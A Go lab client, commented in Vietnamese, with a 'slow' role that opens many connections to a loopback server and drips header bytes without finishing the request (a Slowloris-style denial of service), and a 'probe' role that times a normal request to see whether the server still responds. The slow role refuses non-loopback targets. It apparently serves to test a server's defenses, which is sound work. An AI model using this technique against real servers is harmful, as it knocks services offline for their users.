// Client thí nghiệm (vai "slow", chỉ loopback) và vai "probe" (yêu cầu bình thường).
package main

import (
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

func laLoopback(host string) bool {
	ips, err := net.LookupIP(host)
	if err != nil || len(ips) == 0 {
		return false
	}
	for _, ip := range ips {
		if !ip.IsLoopback() {
			return false
		}
	}
	return true
}

// chaySlow: mở n kết nối và nhỏ giọt từng byte tiêu đề, KHÔNG bao giờ kết thúc phần đầu.
// Dùng địa chỉ nguồn loopback riêng (mặc định 127.0.0.2) để server phân biệt với probe.
func chaySlow(host, port string, n int, nguon string) {
	if !laLoopback(host) {
		fmt.Printf("[slow] TỪ CHỐI: đích %s không phải loopback. "+
			"Vai này chỉ dùng cho 127.0.0.1 trong phòng thí nghiệm của chính bạn.\n", host)
		os.Exit(1)
	}
	if ip := net.ParseIP(nguon); ip == nil || !ip.IsLoopback() {
		fmt.Printf("[slow] TỪ CHỐI: địa chỉ nguồn %s không phải loopback.\n", nguon)
		os.Exit(1)
	}
	fmt.Printf("[slow] (CHỈ THÍ NGHIỆM) mở %d kết nối nhỏ giọt tới %s:%s từ nguồn %s trong ~9s\n",
		n, host, port, nguon)
	dialer := &net.Dialer{Timeout: 2 * time.Second, LocalAddr: &net.TCPAddr{IP: net.ParseIP(nguon)}}
	var socks []net.Conn
	for i := 0; i < n; i++ {
		c, err := dialer.Dial("tcp", net.JoinHostPort(host, port))
		if err != nil {
			continue
		}
		c.Write([]byte("GET /?slow HTTP/1.1\r\nHost: localhost\r\n")) // phần đầu CHƯA kết thúc
		socks = append(socks, c)
	}
	fmt.Printf("[slow] đã mở được %d kết nối; bắt đầu nhỏ giọt mỗi ~7s một byte\n", len(socks))
	hetHan := time.Now().Add(9 * time.Second)
	for time.Now().Before(hetHan) {
		time.Sleep(7 * time.Second)
		song := 0
		for _, c := range socks {
			if _, err := c.Write([]byte("X")); err == nil { // một byte rác, giữ kết nối
				song++
			}
		}
		fmt.Printf("[slow] còn %d kết nối đang giữ\n", song)
	}
	for _, c := range socks {
		c.Close()
	}
	fmt.Println("[slow] đóng toàn bộ kết nối thí nghiệm")
}

// chayProbe: gửi một yêu cầu HTTP/1.1 bình thường, đo xem có được phục vụ không (hạn 4s).
func chayProbe(host, port string) {
	t0 := time.Now()
	c, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 4*time.Second)
	if err != nil {
		fmt.Printf("[probe] THẤT BẠI: %v\n", err)
		return
	}
	defer c.Close()
	c.SetDeadline(time.Now().Add(4 * time.Second))
	c.Write([]byte("GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n"))
	buf := make([]byte, 4096)
	var data []byte
	for !strings.Contains(string(data), "\r\n\r\n") {
		n, err := c.Read(buf)
		if n > 0 {
			data = append(data, buf[:n]...)
		}
		if err != nil {
			break
		}
	}
	dt := time.Since(t0).Milliseconds()
	if len(data) == 0 {
		fmt.Printf("[probe] THẤT BẠI: hết thời gian chờ sau %d ms – server không phục vụ kịp "+
			"(bị tấn công làm nghẽn).\n", dt)
		return
	}
	dongDau := strings.SplitN(string(data), "\r\n", 2)[0]
	if strings.HasPrefix(string(data), "HTTP/1.1 200") {
		fmt.Printf("[probe] THÀNH CÔNG sau %d ms: %s\n", dt, dongDau)
	} else {
		fmt.Printf("[probe] phản hồi khác: %s (%d ms)\n", dongDau, dt)
	}
}
